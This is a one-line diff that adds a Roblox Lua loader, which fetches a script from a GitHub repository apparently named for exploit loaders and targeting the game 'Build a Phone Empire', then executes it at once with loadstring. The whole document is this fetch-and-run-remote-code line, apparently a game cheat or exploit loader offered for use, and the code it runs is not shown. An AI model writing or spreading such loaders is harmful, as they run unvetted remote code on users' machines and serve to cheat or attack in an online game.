@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/build-a-phone-empire-spam6-ocljtmt5m6jewb.lua"))()
